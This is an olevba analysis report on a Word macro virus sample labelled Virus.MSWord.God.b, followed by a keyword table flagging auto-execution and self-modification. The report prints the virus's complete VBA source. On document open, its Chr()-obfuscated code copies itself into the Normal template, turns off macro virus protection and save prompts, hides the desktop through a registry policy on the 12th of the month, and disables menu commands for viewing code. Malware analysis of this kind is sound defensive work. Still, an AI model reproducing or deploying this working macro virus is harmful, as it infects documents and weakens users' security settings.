olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.God.b-3a3273d69b43b6b21686ea0190b53c872429231a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.God.b-3a3273d69b43b6b21686ea0190b53c872429231a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()


On Error Resume Next
Set NT = NormalTemplate.VBProject.VBComponents
Set AD = ActiveDocument.VBProject.VBComponents
Path_ = Chr(67) + Chr(58) + Chr(92) + Chr(80) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(71) + Chr(111) + Chr(100) + Chr(51) + Chr(50) + Chr(46) + Chr(115) + Chr(121) + Chr(115)
For i = 1 To NT.Count
If NT(i).Name = Chr(71) + Chr(111) + Chr(100) Then
    NT(i).export Path_
    NorInst = True
    End If
    Next i
    For i = 1 To AD.Count
    If AD(i).Name = Chr(71) + Chr(111) + Chr(100) Then AD(i).export Path_
    
    DokInst = True
    
    Next i
    If NorInst = False And DokInst = True Then
    NT.Import Path_
    End If
    If NorInst = True And DokInst = False Then
    AD.Import Path_
    End If
If NT(Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116)).CodeModule.Find(Chr(39) + Chr(71) + Chr(111) + Chr(100), 1, 1, 999, 999) = False Then
Dim God(77) As String
God(1) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(79) + Chr(112) + Chr(101) + Chr(110)
God(2) = Chr(79) + Chr(110) + Chr(32) + Chr(101) + Chr(114) + Chr(114) + Chr(111) + Chr(114) + Chr(32) + Chr(114) + Chr(101) + Chr(115) + Chr(117) + Chr(109) + Chr(101) + Chr(32) + Chr(110) + Chr(101) + Chr(120) + Chr(116)
God(3) = Chr(87) + Chr(105) + Chr(116) + Chr(104) + Chr(32) + Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(115)
God(4) = Chr(46) + Chr(65) + Chr(108) + Chr(108) + Chr(111) + Chr(119) + Chr(70) + Chr(97) + Chr(115) + Chr(116) + Chr(83) + Chr(97) + Chr(118) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(70) + Chr(97) + Chr(108) + Chr(115) + Chr(101)
God(5) = Chr(46) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(80) + Chr(114) + Chr(111) + Chr(116) + Chr(101) + Chr(99) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(61) + Chr(32) + Chr(70) + Chr(97) + Chr(108) + Chr(115) + Chr(101)
God(6) = Chr(46) + Chr(83) + Chr(97) + Chr(118) + Chr(101) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(80) + Chr(114) + Chr(111) + Chr(109) + Chr(112) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(70) + Chr(97) + Chr(108) + Chr(115) + Chr(101)
God(7) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(87) + Chr(105) + Chr(116) + Chr(104)
God(8) = Chr(87) + Chr(105) + Chr(116) + Chr(104) + Chr(32) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110)
God(9) = Chr(46) + Chr(67) + Chr(97) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(246) + Chr(114) + Chr(100) + Chr(32) + Chr(45) + Chr(71) + Chr(111) + Chr(100) + Chr(34)
God(10) = Chr(46) + Chr(68) + Chr(105) + Chr(115) + Chr(112) + Chr(108) + Chr(97) + Chr(121) + Chr(65) + Chr(108) + Chr(101) + Chr(114) + Chr(116) + Chr(115) + Chr(32) + Chr(61) + Chr(32) + Chr(119) + Chr(100) + Chr(65) + Chr(108) + Chr(101) + Chr(114) + Chr(116) + Chr(115) + Chr(78) + Chr(111) + Chr(110) + Chr(101)
God(11) = Chr(46) + Chr(65) + Chr(115) + Chr(115) + Chr(105) + Chr(115) + Chr(116) + Chr(97) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(105) + Chr(115) + Chr(105) + Chr(98) + Chr(108) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101)
God(12) = Chr(46) + Chr(65) + Chr(115) + Chr(115) + Chr(105) + Chr(115) + Chr(116) + Chr(97) + Chr(110) + Chr(116) + Chr(46) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(61) + Chr(32) + Chr(109) + Chr(115) + Chr(111) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(71) + Chr(114) + Chr(101) + Chr(101) + Chr(116) + Chr(105) + Chr(110) + Chr(103)
God(13) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(87) + Chr(105) + Chr(116) + Chr(104)
God(14) = Chr(87) + Chr(105) + Chr(116) + Chr(104) + Chr(32) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(46) + Chr(65) + Chr(115) + Chr(115) + Chr(105) + Chr(115) + Chr(116) + Chr(97) + Chr(110) + Chr(116) + Chr(46) + Chr(78) + Chr(101) + Chr(119) + Chr(66) + Chr(97) + Chr(108) + Chr(108) + Chr(111) + Chr(111) + Chr(110)
God(15) = Chr(46) + Chr(84) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(114) + Chr(58) + Chr(32) + Chr(90) + Chr(101) + Chr(114) + Chr(248) + Chr(124) + Chr(60) + Chr(76) + Chr(122) + Chr(216) + Chr(62) + Chr(34)
God(16) = Chr(46) + Chr(72) + Chr(101) + Chr(97) + Chr(100) + Chr(105) + Chr(110) + Chr(103) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(87) + Chr(77) + Chr(57) + Chr(55) + Chr(46) + Chr(71) + Chr(111) + Chr(100) + Chr(95) + Chr(67) + Chr(34)
God(17) = Chr(46) + Chr(83) + Chr(104) + Chr(111) + Chr(119)
God(18) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(87) + Chr(105) + Chr(116) + Chr(104)
God(19) = Chr(73) + Chr(102) + Chr(32) + Chr(68) + Chr(97) + Chr(121) + Chr(40) + Chr(78) + Chr(111) + Chr(119) + Chr(41) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(50) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
God(20) = Chr(39) + Chr(71) + Chr(111) + Chr(100)
God(21) = Chr(83) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Chr(46) + Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(80) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101) + Chr(83) + Chr(116) + Chr(114) + Chr(105) + Chr(110) + _
    Chr(103) + Chr(40) + Chr(34) + Chr(34) + Chr(44) + Chr(32) + Chr(34) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(83) + Chr(92) + Chr(46) + Chr(68) + Chr(101) + Chr(102) + Chr(97) + Chr(117) + Chr(108) + Chr(116) + Chr(92) + Chr(83) + Chr(111) + _
    Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(87) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(67) + Chr(117) + Chr(114) + _
    Chr(114) + Chr(101) + Chr(110) + Chr(116) + Chr(86) + Chr(101) + Chr(114) + Chr(115) + Chr(105) + Chr(111) + Chr(110) + Chr(92) + Chr(80) + Chr(111) + Chr(108) + Chr(105) + Chr(99) + Chr(105) + Chr(101) + Chr(115) + Chr(92) + Chr(69) + Chr(120) + Chr(112) + Chr(108) + Chr(111) + Chr(114) + Chr(101) + _
    Chr(114) + Chr(34) + Chr(44) + Chr(32) + Chr(34) + Chr(78) + Chr(111) + Chr(68) + Chr(101) + Chr(115) + Chr(107) + Chr(116) + Chr(111) + Chr(112) + Chr(34) + Chr(41) + Chr(32) + Chr(61) + Chr(32) + Chr(49)
God(22) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
God(23) = Chr(73) + Chr(110) + Chr(102) + Chr(101) + Chr(99) + Chr(116) + Chr(105) + Chr(111) + Chr(110)
God(24) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(25) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(73) + Chr(110) + Chr(102) + Chr(101) + Chr(99) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(40) + Chr(41)
God(26) = Chr(83) + Chr(101) + Chr(116) + Chr(32) + Chr(65) + Chr(68) + Chr(32) + Chr(61) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115)
God(27) = Chr(83) + Chr(101) + Chr(116) + Chr(32) + Chr(78) + Chr(84) + Chr(32) + Chr(61) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115)
God(28) = Chr(80) + Chr(97) + Chr(116) + Chr(104) + Chr(95) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(67) + Chr(58) + Chr(92) + Chr(80) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(71) + Chr(111) + Chr(100) + Chr(51) + Chr(50) + Chr(46) + Chr(115) + Chr(121) + Chr(115) + Chr(34)
God(29) = Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(105) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(78) + Chr(84) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116)
God(30) = Chr(73) + Chr(102) + Chr(32) + Chr(78) + Chr(84) + Chr(40) + Chr(105) + Chr(41) + Chr(46) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(71) + Chr(111) + Chr(100) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
God(31) = Chr(78) + Chr(111) + Chr(114) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101)
God(32) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
God(33) = Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(105)
God(34) = Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(105) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(65) + Chr(68) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116)
God(35) = Chr(73) + Chr(102) + Chr(32) + Chr(65) + Chr(68) + Chr(40) + Chr(105) + Chr(41) + Chr(46) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(71) + Chr(111) + Chr(100) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
God(36) = Chr(68) + Chr(111) + Chr(107) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101)
God(37) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
God(38) = Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(105)
God(39) = Chr(73) + Chr(102) + Chr(32) + Chr(68) + Chr(111) + Chr(107) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101) + Chr(32) + Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(70) + Chr(97) + Chr(108) + Chr(115) + Chr(101) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
God(40) = Chr(78) + Chr(84) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(80) + Chr(97) + Chr(116) + Chr(104) + Chr(95)
God(41) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
God(42) = Chr(73) + Chr(102) + Chr(32) + Chr(68) + Chr(111) + Chr(107) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(70) + Chr(97) + Chr(108) + Chr(115) + Chr(101) + Chr(32) + Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
God(43) = Chr(65) + Chr(68) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(80) + Chr(97) + Chr(116) + Chr(104)
God(44) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
God(45) = Chr(74) + Chr(67) + Chr(69)
God(46) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(47) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(97) + Chr(116) + Chr(101) + Chr(105) + Chr(83) + Chr(112) + Chr(101) + Chr(105) + Chr(99) + Chr(104) + Chr(101) + Chr(114) + Chr(110) + Chr(85) + Chr(110) + Chr(116) + Chr(101) + Chr(114) + Chr(40) + Chr(41)
God(48) = Chr(73) + Chr(110) + Chr(102) + Chr(101) + Chr(99) + Chr(116) + Chr(105) + Chr(111) + Chr(110)
God(49) = Chr(68) + Chr(105) + Chr(97) + Chr(108) + Chr(111) + Chr(103) + Chr(115) + Chr(40) + Chr(119) + Chr(100) + Chr(68) + Chr(105) + Chr(97) + Chr(108) + Chr(111) + Chr(103) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(83) + Chr(97) + Chr(118) + Chr(101) + Chr(65) + Chr(115) + Chr(41) + Chr(46) + Chr(83) + Chr(104) + Chr(111) + Chr(119)
God(50) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(51) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(97) + Chr(116) + Chr(101) + Chr(105) + Chr(83) + Chr(112) + Chr(101) + Chr(105) + Chr(99) + Chr(104) + Chr(101) + Chr(114) + Chr(110) + Chr(40) + Chr(41)
God(52) = Chr(73) + Chr(110) + Chr(102) + Chr(101) + Chr(99) + Chr(116) + Chr(105) + Chr(111) + Chr(110)
God(53) = Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(83) + Chr(97) + Chr(118) + Chr(101) + Chr(65) + Chr(115) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(70) + Chr(117) + Chr(108) + Chr(108) + Chr(78) + Chr(97) + Chr(109) + Chr(101)
God(54) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(55) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(97) + Chr(116) + Chr(101) + Chr(105) + Chr(68) + Chr(111) + Chr(107) + Chr(86) + Chr(111) + Chr(114) + Chr(108) + Chr(97) + Chr(103) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
God(56) = Chr(77) + Chr(115) + Chr(103) + Chr(66) + Chr(111) + Chr(120) + Chr(32) + Chr(34) + Chr(90) + Chr(117) + Chr(32) + Chr(119) + Chr(101) + Chr(110) + Chr(105) + Chr(103) + Chr(32) + Chr(65) + Chr(114) + Chr(98) + Chr(101) + Chr(105) + Chr(116) + Chr(115) + Chr(115) + Chr(112) + Chr(101) + Chr(105) + Chr(99) + Chr(104) + Chr(101) + Chr(114) + Chr(32) + Chr(117) + Chr(109) + Chr(32) + Chr(65) + Chr(110) + Chr(119) + Chr(101) + Chr(110) + Chr(100) + Chr(117) + Chr(110) + Chr(103) + Chr(32) + Chr(97) + Chr(117) + Chr(115) + Chr(122) + Chr(117) + Chr(102) + Chr(252) + Chr(104) + Chr(114) + Chr(101) + Chr(110) + Chr(33) + Chr(34) + Chr(44) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(105) + Chr(116) + Chr(105) + Chr(99) + Chr(97) + Chr(108)
God(57) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(58) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(110) + Chr(115) + Chr(105) + Chr(99) + Chr(104) + Chr(116) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(40) + Chr(41)
God(59) = Chr(77) + Chr(115) + Chr(103) + Chr(66) + Chr(111) + Chr(120) + Chr(32) + Chr(34) + Chr(90) + Chr(117) + Chr(32) + Chr(119) + Chr(101) + Chr(110) + Chr(105) + Chr(103) + Chr(32) + Chr(65) + Chr(114) + Chr(98) + Chr(101) + Chr(105) + Chr(116) + Chr(115) + Chr(115) + Chr(112) + Chr(101) + Chr(105) + Chr(99) + Chr(104) + Chr(101) + Chr(114) + Chr(32) + Chr(117) + Chr(109) + Chr(32) + Chr(65) + Chr(110) + Chr(119) + Chr(101) + Chr(110) + Chr(100) + Chr(117) + Chr(110) + Chr(103) + Chr(32) + Chr(97) + Chr(117) + Chr(115) + Chr(122) + Chr(117) + Chr(102) + Chr(252) + Chr(104) + Chr(114) + Chr(101) + Chr(110) + Chr(33) + Chr(34) + Chr(44) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(105) + Chr(116) + Chr(105) + Chr(99) + Chr(97) + Chr(108)
God(60) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(61) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(110) + Chr(115) + Chr(105) + Chr(99) + Chr(104) + Chr(116) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(40) + Chr(41)
God(62) = Chr(77) + Chr(115) + Chr(103) + Chr(66) + Chr(111) + Chr(120) + Chr(32) + Chr(34) + Chr(90) + Chr(117) + Chr(32) + Chr(119) + Chr(101) + Chr(110) + Chr(105) + Chr(103) + Chr(32) + Chr(65) + Chr(114) + Chr(98) + Chr(101) + Chr(105) + Chr(116) + Chr(115) + Chr(115) + Chr(112) + Chr(101) + Chr(105) + Chr(99) + Chr(104) + Chr(101) + Chr(114) + Chr(32) + Chr(117) + Chr(109) + Chr(32) + Chr(65) + Chr(110) + Chr(119) + Chr(101) + Chr(110) + Chr(100) + Chr(117) + Chr(110) + Chr(103) + Chr(32) + Chr(97) + Chr(117) + Chr(115) + Chr(122) + Chr(117) + Chr(102) + Chr(252) + Chr(104) + Chr(114) + Chr(101) + Chr(110) + Chr(33) + Chr(34) + Chr(44) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(105) + Chr(116) + Chr(105) + Chr(99) + Chr(97) + Chr(108)
God(63) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(64) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(69) + Chr(120) + Chr(116) + Chr(114) + Chr(97) + Chr(115) + Chr(77) + Chr(97) + Chr(107) + Chr(114) + Chr(111) + Chr(40) + Chr(41)
God(65) = Chr(77) + Chr(115) + Chr(103) + Chr(66) + Chr(111) + Chr(120) + Chr(32) + Chr(34) + Chr(90) + Chr(117) + Chr(32) + Chr(119) + Chr(101) + Chr(110) + Chr(105) + Chr(103) + Chr(32) + Chr(65) + Chr(114) + Chr(98) + Chr(101) + Chr(105) + Chr(116) + Chr(115) + Chr(115) + Chr(112) + Chr(101) + Chr(105) + Chr(99) + Chr(104) + Chr(101) + Chr(114) + Chr(32) + Chr(117) + Chr(109) + Chr(32) + Chr(65) + Chr(110) + Chr(119) + Chr(101) + Chr(110) + Chr(100) + Chr(117) + Chr(110) + Chr(103) + Chr(32) + Chr(97) + Chr(117) + Chr(115) + Chr(122) + Chr(117) + Chr(102) + Chr(252) + Chr(104) + Chr(114) + Chr(101) + Chr(110) + Chr(33) + Chr(34) + Chr(44) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(105) + Chr(116) + Chr(105) + Chr(99) + Chr(97) + Chr(108)
God(66) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
God(67) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(74) + Chr(67) + Chr(69) + Chr(40) + Chr(41)
God(68) = Chr(83) + Chr(101) + Chr(116) + Chr(32) + Chr(78) + Chr(84) + Chr(32) + Chr(61) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115)
God(69) = Chr(76) + Chr(83) + Chr(32) + Chr(61) + Chr(32) + Chr(78) + Chr(84) + Chr(40) + Chr(34) + Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(34) + Chr(41) + Chr(46) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116) + Chr(79) + Chr(102) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(115)
God(70) = Chr(73) + Chr(102) + Chr(32) + Chr(76) + Chr(83) + Chr(32) + Chr(60) + Chr(32) + Chr(50) + Chr(48) + Chr(48) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
God(71) = Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(120) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(73) + Chr(110) + Chr(116) + Chr(40) + Chr(40) + Chr(82) + Chr(110) + Chr(100) + Chr(32) + Chr(42) + Chr(32) + Chr(53) + Chr(48) + Chr(41) + Chr(32) + Chr(43) + Chr(32) + Chr(49) + Chr(41)
God(72) = Chr(76) + Chr(69) + Chr(32) + Chr(61) + Chr(32) + Chr(73) + Chr(110) + Chr(116) + Chr(40) + Chr(82) + Chr(110) + Chr(100) + Chr(40) + Chr(41) + Chr(32) + Chr(42) + Chr(32) + Chr(76) + Chr(83) + Chr(32) + Chr(43) + Chr(32) + Chr(49) + Chr(41)
God(73) = Chr(73) + Chr(84) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(39) + Chr(34) + Chr(32) + Chr(38) + Chr(32) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(46) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(80) + Chr(114) + Chr(105) + Chr(110) + Chr(116) + Chr(101) + Chr(114) + Chr(32) + Chr(38) + Chr(32) + Chr(34) + Chr(32) + Chr(34) + Chr(32) + Chr(38) + Chr(32) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(46) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(32) + Chr(38) + Chr(32) + Chr(34) + Chr(32) + Chr(34) + Chr(32) + Chr(38) + Chr(32) + Chr(78) + Chr(111) + Chr(119)
God(74) = Chr(78) + Chr(84) + Chr(40) + Chr(34) + Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(34) + Chr(41) + Chr(46) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(46) + Chr(73) + Chr(110) + Chr(115) + Chr(101) + Chr(114) + Chr(116) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(115) + Chr(32) + Chr(76) + Chr(69) + Chr(44) + Chr(32) + Chr(73) + Chr(84)
God(75) = Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(120)
God(76) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
God(77) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
For i = 1 To 77
Code = Code & God(i) & Chr(13)
NT(Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116)).CodeModule.InsertLines i, Code
Code = ""
Next i
End If
End Sub
Sub DateiDokVorlagen()


End Sub
Sub AnsichtCode()


End Sub
Sub AnsichtVBCode()


End Sub
Sub ExtrasMakro()

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

